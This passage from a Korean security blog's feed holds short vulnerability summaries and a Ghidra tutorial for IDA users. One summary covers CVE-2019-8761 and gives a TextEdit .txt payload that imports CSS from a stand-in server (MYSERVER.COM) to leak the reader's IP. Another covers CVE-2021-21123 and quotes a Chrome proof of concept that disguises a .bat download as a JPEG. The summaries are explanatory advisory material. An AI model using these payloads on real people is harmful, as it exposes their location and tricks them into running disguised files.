&#xC2E4;&#xD589;&#xB3C4; &#xAC00;&#xB2A5;&#xC131; &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mac</tag>
      
      <tag>zero click</tag>
      
      <tag>idioth</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2019-8761: MacOS txt 파일로 html 실행</title>
    <link href="/2021/04/04/insu/2021-04-04/"/>
    <url>/2021/04/04/insu/2021-04-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.paulosyibelo.com/2021/04/this-man-thought-opening-txt-file-is.html">THIS MAN THOUGHT OPENING A TXT FILE IS FINE, HE THOUGHT WRONG. MACOS CVE-2019-8761</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>macOS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MacOS&#xC5D0;&#xC11C; TextEdit&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC7A5;&#xC790;&#xBA85;&#xC774; txt&#xC784;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; RTF-HTML &#xD30C;&#xC77C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB9CC;&#xC57D; txt &#xD30C;&#xC77C;&#xC774; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC2DC;&#xC791;&#xD558;&#xBA74;, txt &#xD30C;&#xC77C;&#xC784;&#xC5D0;&#xB3C4; HTML &#xD30C;&#xC2F1;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</code></pre><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; CSS &#xC18D;&#xC131;&#xC774; &#xB85C;&#xCEEC; CSS &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;style&gt; @import { &quot;url &quot; } &lt;/stymle&gt;</code></pre><p>&#xD558;&#xC9C0;&#xB9CC; &#xC791;&#xB3D9;&#xD558;&#xB294; scheme&#xC740; <code>file://</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC740; &#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC; &#xB85C;&#xCEEC;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xB2E4;&#xB978; &#xB85C;&#xCEEC; &#xD30C;&#xC77C;&#xC744;  &#xC5F4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  OSX&#xC758; AutoMount &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>ls /net/EXAMPLE.com</code>&#xC744; &#xC218;&#xD589;&#xD558;&#xBA74; OSX&#xAC00; <code>EXAMPLE.com</code>&#xC5D0; &#xC6D0;&#xACA9; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0C5;&#xB2C8;&#xB2E4;. TextEdit&#xC5D0;&#xC11C; &#xC678;&#xBD80; &#xC694;&#xCCAD;&#xC744; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xCC28;&#xB2E8;&#xD558;&#xC600;&#xC9C0;&#xB9CC; <code>file://</code> scheme&#xB97C; &#xD1B5;&#xD574; <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>MYSERVER.COM</code>&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;style&gt;@import{ &quot;file:///net/MYSERVER.COM/a.css&quot;} &lt;/style&gt;I know where you are...&lt;/body&gt;&lt;/html&gt;</code></pre><p>AutoMount&#xB294; &#xCEE4;&#xB110;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; TCP &#xC5F0;&#xACB0;&#xC744; &#xD558;&#xBBC0;&#xB85C; &#xD504;&#xB85D;&#xC2DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB354;&#xB77C;&#xB3C4; &#xC2E4;&#xC81C; IP &#xC8FC;&#xC18C;&#xB97C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>insu</tag>
      
      <tag>cve</tag>
      
      <tag>mac</tag>
      
      <tag>information disclosure</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 3 - A few tips for IDA User</title>
    <link href="/2021/04/04/idioth/ghidra_part3/"/>
    <url>/2021/04/04/idioth/ghidra_part3/</url>
    
    <content type="html"><![CDATA[<p><strong>&#xB2E4;&#xB978; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 2 - Data, Functions, Scripts</a></p><p>Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 3 - tips for IDA User (Here!)</p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 4 - Malware Analysis (1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 5 - Malware Analysis (2)</a></p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! &#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xCC3E;&#xC544;&#xBD59;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC11;&#xC790;&#xAE30; &#xB0A0;&#xC528;&#xAC00; &#xC5C4;&#xCCAD;&#xB098;&#xAC8C; &#xB354;&#xC6CC;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBD04; &#xC637;&#xC744; &#xAEBC;&#xB0BC; &#xACA8;&#xB97C;&#xB3C4; &#xC5C6;&#xC774; &#xAC11;&#xC790;&#xAE30; &#xC5EC;&#xB984;&#xC774; &#xCC3E;&#xC544;&#xC628; &#xAC83;&#xB9CC; &#xAC19;&#xC740; &#xB290;&#xB08C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled.png" alt></p><p>&#xC77C;&#xAD50;&#xCC28;&#xB294; &#xB610; &#xC5C4;&#xCCAD; &#xCEE4;&#xC11C; &#xBC24;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xACE0; &#xC637;&#xC744; &#xC785;&#xC73C;&#xBA74; &#xB0AE;&#xC5D0;&#xB294; &#xBD88;&#xD0C0;&#xB294; &#xC0B6;&#xC744; &#xC0B4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; BMW&#xAC00; &#xB108;&#xBB34; &#xB365;&#xC2B5;&#xB2C8;&#xB2E4;. Bus&#xC640; Metro&#xB294; &#xC0AC;&#xB78C;&#xB4E4;&#xC758; &#xC5F4;&#xAE30;&#xB85C; &#xD6C4;&#xB048;&#xD6C4;&#xB048;&#xD558;&#xACE0;&#x2026; &#xC774; &#xB0A0;&#xC528;&#xC5D0; Walk&#xB97C; &#xD558;&#xBA74; &#xB9C8;&#xC2A4;&#xD06C;&#xC5D0;&#xB3C4; &#xB540;&#xC774; &#xCC28;&#xB294;&#x2026;</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%201.png" alt></p><p>&#xB0A0;&#xC528;&#xB3C4; &#xB365;&#xACE0; &#xD53C;&#xACE4;&#xD558;&#xB2C8; &#xC2DC;&#xC6D0;&#xD55C; &#xC544;&#xBA54;&#xB9AC;&#xCE74;&#xB178; &#xD55C; &#xC794; &#xB9C8;&#xC2DC;&#xBA74;&#xC11C; &#xC624;&#xB298;&#xC758; &#xC8FC;&#xC81C;&#xC778; IDA &#xC0AC;&#xC6A9;&#xC790;&#xB97C; &#xC704;&#xD55C; ghidra &#xD301;! &#xC744; &#xC2DC;&#xC791;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="API-call-parameter-&#xC790;&#xB3D9;-&#xCF54;&#xBA58;&#xD2B8;"><a href="#API-call-parameter-&#xC790;&#xB3D9;-&#xCF54;&#xBA58;&#xD2B8;" class="headerlink" title="API call parameter &#xC790;&#xB3D9; &#xCF54;&#xBA58;&#xD2B8;"></a>API call parameter &#xC790;&#xB3D9; &#xCF54;&#xBA58;&#xD2B8;</h1><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%202.png" alt></p><p>IDA&#xC758; &#xACBD;&#xC6B0; &#xC704;&#xC640; &#xAC19;&#xC774; Windows API&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xACBD;&#xC6B0;, &#xAC01; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC774;&#xB984;&#xC744; &#xCF54;&#xBA58;&#xD2B8;&#xB85C; &#xB2EC;&#xC544;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%203.png" alt></p><p>&#xD558;&#xC9C0;&#xB9CC; analysis&#xB97C; &#xD560; &#xB54C; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xC744; &#xD55C;&#xB2E4;&#xBA74; ghidra&#xB294; &#xCF54;&#xBA58;&#xD2B8;&#xB97C; &#xB2EC;&#xC544;&#xC8FC;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; <code>memset</code>&#xC774;&#xB77C; &#xC801;&#xD78C; &#xBD80;&#xBD84;&#xC5D0; &#xC788;&#xB294; &#xCF54;&#xBA58;&#xD2B8;&#xB97C; &#xBCF4;&#xBA74; &#xC5B4;&#xB5A0;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130; &#xC774;&#xB984;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xACE0; &#xADF8;&#xAC70;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xB9E4;&#xCE58;&#xB97C; &#xD558;&#xBA74; &#xB418;&#xAE34; &#xD569;&#xB2C8;&#xB2E4;&#xB9CC;&#x2026; &#xD55C; &#xBC88; &#xB354; &#xC0DD;&#xAC01;&#xC744; &#xD574;&#xC57C; &#xD558;&#xB2C8; &#xC880; &#xBD88;&#xD3B8;&#xD558;&#xC8E0;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%204.png" alt></p><p>analysis option&#xC5D0;&#xC11C; WindowsPE x86 Propagate External Parameters &#xC635;&#xC158;&#xC744; &#xCCB4;&#xD06C;&#xD55C; &#xD6C4; Analyze&#xB97C; &#xC9C4;&#xD589;&#xD558;&#xBA74;..?</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%205.png" alt></p><p>&#xC5B4;&#xB5A4; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC778;&#xC9C0;, &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC758; &#xC790;&#xB8CC;&#xD615;&#xACFC; &#xC774;&#xB984;&#xAE4C;&#xC9C0; &#xBAA8;&#xB450; &#xCF54;&#xBA58;&#xD2B8;&#xB85C; &#xC791;&#xC131;&#xB429;&#xB2C8;&#xB2E4;!</p><p>&#xD639;&#xC2DC;.. &#xC635;&#xC158;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC78; &#xAE4C;&#xBA39;&#xACE0; Analyze&#xB97C; &#xC9C4;&#xD589;&#xC744; &#xD558;&#xC168;&#xB2E4;&#xBA74; &#xAD73;&#xC774; &#xAED0;&#xB2E4; &#xD0AC; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%206.png" alt></p><p>Analysis - One Shot - WindowsPE x86 Propagate External Parameters&#xB97C; &#xD1B5;&#xD574;&#xC11C; &#xC9C4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%207.png" alt></p><h1 id="flag-constant-&#xC124;&#xC815;"><a href="#flag-constant-&#xC124;&#xC815;" class="headerlink" title="flag constant &#xC124;&#xC815;"></a>flag constant &#xC124;&#xC815;</h1><p>&#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D; &#xB4F1;&#xC744; &#xD558;&#xB2E4; &#xBCF4;&#xBA74; <code>CreateFileA()</code> &#xB4F1;&#xC758; API&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7EC;&#xD55C; API&#xB4E4;&#xC740; flag &#xAC12;&#xC5D0; <code>0x00000004</code>&#xC774; <code>FILE_SHARE_DELETE</code>&#xB77C;&#xB358;&#xC9C0;&#xC758; constant&#xB97C; &#xAC16;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB9CE;&#xC774; &#xC788;&#xC8E0;.</p><p>IDA&#xC5D0;&#xC11C;&#xB294; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC12;&#xC744; &#xC6B0;&#xD074;&#xB9AD;&#xD558;&#xC5EC; &#x2018;Use standard symbolic constant&#x2019;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xAC12;&#xC744; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%208.png" alt></p><p><code>CreateProcessA</code>&#xC758; <code>0x80000000</code> &#xD50C;&#xB798;&#xADF8; &#xAC12;&#xC740; <code>CREATE_NO_WINDOW</code>&#xC758; &#xAC12;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC774;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xC5EC; &#xC124;&#xC815;&#xD558;&#xBA74;</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%209.png" alt></p><p>&#xC774;&#xB7F0; &#xC2DD;&#xC73C;&#xB85C; &#xD45C;&#xC2DC;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2010.png" alt></p><p>ghidra&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD55C; &#xB611;&#xAC19;&#xC740; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. <code>0x80000000</code> &#xBD80;&#xBD84;&#xC744; &#xB611;&#xAC19;&#xC774; <code>CREATE_NO_WINODW</code>&#xB85C; &#xD45C;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB611;&#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC6B0;&#xD074;&#xB9AD;&#xD558;&#xACE0; &#x2018;Set Equation(&#xB2E8;&#xCD95;&#xD0A4; E)&#x2019;&#xB97C; &#xB204;&#xB985;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2011.png" alt></p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2012.png" alt></p><p>&#xD574;&#xB2F9; &#xCC3D;&#xC744; &#xD655;&#xC778;&#xD558;&#xC2DC;&#xBA74; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xAC12;&#xB4E4;&#xC774; &#xB739;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2013.png" alt></p><p>IDA&#xC5D0;&#xC11C; &#xB728;&#xB294; &#xCC3D;&#xACFC; &#xBE44;&#xAD50;&#xD574; &#xBD24;&#xC744; &#xB54C;, &#xD070; &#xCC28;&#xC774;&#xAC00; &#xC5C6;&#xC8E0;? &#xC774;&#xC81C; &#xC800;&#xAE30;&#xC11C; <code>CREATE_NO_WINDOW</code>&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2014.png" alt></p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2015.png" alt></p><p><code>0x80000000</code>&#xC774; &#xBAA8;&#xB450; <code>CREATE_NO_WINDOW</code>&#xB85C; &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h1 id="&#xBD84;&#xB7C9;-&#xC870;&#xC808;-&#xC2E4;&#xD328;"><a href="#&#xBD84;&#xB7C9;-&#xC870;&#xC808;-&#xC2E4;&#xD328;" class="headerlink" title="&#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;!"></a>&#xBD84;&#xB7C9; &#xC870;&#xC808; &#xC2E4;&#xD328;!</h1><p>&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD558;&#xAC8C; &#xBD84;&#xB7C9; &#xC870;&#xC808;&#xC744; &#xC2E4;&#xD328;&#xD574;&#xBC84;&#xB838;&#xC2B5;&#xB2C8;&#xB2E4;! unreachable code &#xB4F1;&#xC758; &#xBD80;&#xBD84;&#xC740; &#xAE30;&#xBCF8; &#xC124;&#xC815;&#xC73C;&#xB85C; &#xB418;&#xC5B4; &#xC788;&#xACE0;&#x2026; (&#xBD84;&#xBA85; &#xC608;&#xC804;&#xC5D0;&#xB294; &#xAE30;&#xBCF8; &#xC124;&#xC815; &#xC544;&#xB2C8;&#xC5C8;&#xB358; &#xAC83; &#xAC19;&#xC740;&#xB370; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xBA74;&#xC11C; &#xBC14;&#xB00C;&#xC5C8;&#xB098;&#x2026;? &#x3160;&#x3160;) IDAPython&#xC774;&#xB098; &#xADF8;&#xB798;&#xD504; &#xBDF0; &#xB4F1;&#xC740; &#xC774;&#xC804; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xC5C8;&#xC8E0;.</p><p>&#xC0AC;&#xC2E4; &#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; WinAPI&#xC5D0; &#xB300;&#xD55C; &#xAC83;&#xC744; &#xB2E4;&#xB8EC; &#xC774;&#xC720;&#xB294; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xB97C; &#xC704;&#xD574;&#xC11C;&#xC785;&#xB2C8;&#xB2E4;&#x2026; &#xAE09;&#xD558;&#xAC8C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. Part 4&#xC5D0;&#xC11C;&#xB294; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; ghidra&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xB824; &#xD569;&#xB2C8;&#xB2E4;!</p><p>&#xC640;! &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xBA74; API &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0; &#xC5B4;&#xB5A4; &#xAC8C; &#xB4E4;&#xC5B4;&#xAC00;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xC57C; &#xD558;&#xACE0;, flag &#xAC12;&#xB3C4; hex&#xB85C; &#xB098;&#xC624;&#xB294; &#xAC83;&#xBCF4;&#xB2E4; constant &#xC774;&#xB984;&#xC744; &#xC54C;&#xB824;&#xC8FC;&#xBA74; &#xB108;&#xBB34;&#xB098;&#xB3C4; &#xD3B8;&#xB9AC;&#xD558;&#xC796;&#xC544;? &#xB9DE;&#xC8E0;? &#xADF8;&#xB807;&#xC8E0;? &#x2026;. &#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xD48D;&#xC871;&#xD55C; &#xBD84;&#xB7C9;&#xC758; &#xAE00;&#xC744; &#xAC00;&#xC838;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558;</p><p><img src="/2021/04/04/idioth/ghidra_part3/Untitled%2016.png" alt></p><p>&#xBA38;&#xB9AC;&#xB97C; &#xBC15;&#xC73C;&#xBA70; &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xB97C; &#xC900;&#xBE44;&#xD574;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21123: Chrome에서 발생하는 확장자 spoofing</title>
    <link href="/2021/04/03/fabu1ous/2021-04-03/"/>
    <url>/2021/04/03/fabu1ous/2021-04-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1137247">Issue 1137247: Security: Spoofing download filename extension in 86 chrome</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Google Chrome &lt; 88.0.4324.96</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><blockquote><p>CVE-2021-21123:  88.0.4324.96 &#xC774;&#xC804; Google Chrome&#xC758; File System API&#xC5D0;&#xC11C; &#xBD88;&#xCDA9;&#xBD84;&#xD55C; &#xB370;&#xC774;&#xD130; &#xC720;&#xD6A8;&#xC131; &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC870;&#xC791;&#xB41C; HTML &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; &#xC81C;&#xD55C;&#xC744; &#xBB34;&#xC2DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p></blockquote><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">        <span class="hljs-keyword">const</span> butSaveNewFile = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;addNewFile&apos;</span>)</span><span class="javascript">        butSaveNewFile.addEventListener(<span class="hljs-string">&apos;click&apos;</span>, <span class="hljs-keyword">async</span> () =&gt; {</span><span class="javascript">            <span class="hljs-keyword">const</span> options = {</span>                types: [                    {                        description:<span class="javascript">                            <span class="hljs-string">&apos;JPEG Image (*.jpeg)                                                                                                                                                                                                                                                         &apos;</span>,</span>                        accept: {<span class="javascript">                            <span class="hljs-string">&apos;text/plain&apos;</span>: [<span class="hljs-string">&apos;.bat&apos;</span>]</span>                        },<span class="javascript">                        content: <span class="hljs-string">&apos;C:\\Windows\\system32\\calc.exe&apos;</span></span>                    }                ]            }<span class="javascript">            <span class="hljs-keyword">const</span> handle = <span class="hljs-keyword">await</span> <span class="hljs-built_in">window</span>.showSaveFilePicker(options)</span><span class="javascript">            <span class="hljs-keyword">const</span> writable = <span class="hljs-keyword">await</span> handle.createWritable()</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.write(<span class="hljs-string">&apos;C:\\Windows\\system32\\calc.exe&apos;</span>)</span><span class="javascript">            <span class="hljs-keyword">await</span> writable.close()</span><span class="javascript">            alert(<span class="hljs-string">&apos;File saved&apos;</span>)</span>        })    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>&#xC704;&#xB294; &#xACF5;&#xAC1C;&#xB41C; HTML PoC&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;. &#xBCC0;&#xC218;  <code>description</code>&#xC758; &#xAC12;&#xC740; Google Chrome&#xC774; &#xD638;&#xCD9C;&#xD558;&#xB294; &#x201C;Save as(&#xB2E4;&#xB978; &#xC774;&#xB984;&#xC73C;&#xB85C; &#xC800;&#xC7A5;)&#x201D; &#xCC3D;&#xC5D0;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB420; &#xD30C;&#xC77C;&#xC758; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xC6A9;&#xB3C4;&#xB85C; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. <code>description</code>&#xC5D0; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xACF5;&#xBC31; &#xBB38;&#xC790; &#xD639;&#xC740; <code>*</code>&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xB9C9;&#xB294; &#xD544;&#xD130;&#xB9C1;&#xC758; &#xBD80;&#xC7AC;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xB420; &#xD30C;&#xC77C;&#xC758; &#xC2E4;&#xC81C; &#xD655;&#xC7A5;&#xC790;&#xB97C; &#xC228;&#xAE30;&#xAC70;&#xB098; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(Spoofing download filename). &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xD0C0;&#xAC9F; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC545;&#xC131; &#xCF54;&#xB4DC;&#xB97C; &#xC124;&#xCE58; &#xBC0F; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; User Interaction&#xC774; &#xD544;&#xC694;&#xD568;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xB192;&#xC740; &#xC2EC;&#xAC01;&#xB3C4;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xBD84;&#xB958;&#xB410;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>spoofing</tag>
      
      <tag>chrome</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-26863: race condition을 통한 win32k 커널 UAF 취약점</title>
    <link href="/2021/04/02/l0ch/2021-04-02/"/>
    <url>/2021/04/02/l0ch/2021-04-02/</url>
    
